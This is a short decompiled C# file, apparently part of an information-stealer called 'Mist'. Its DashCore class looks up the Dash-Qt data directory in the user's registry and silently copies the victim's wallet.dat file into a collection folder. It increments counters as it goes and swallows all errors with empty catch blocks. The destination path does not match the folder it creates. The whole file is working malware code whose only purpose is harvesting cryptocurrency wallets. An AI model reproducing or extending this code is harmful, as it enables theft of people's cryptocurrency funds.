using System;
using System.IO;
using Microsoft.Win32;

namespace Mist
{
	// Token: 0x02000068 RID: 104
	internal class DashCore
	{
		// Token: 0x0600028B RID: 651 RVA: 0x00012594 File Offset: 0x00010794
		public static void DSHcoinStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\DashCore\\");
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
						DashCore.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400015D RID: 349
		public static int count;
	}
}
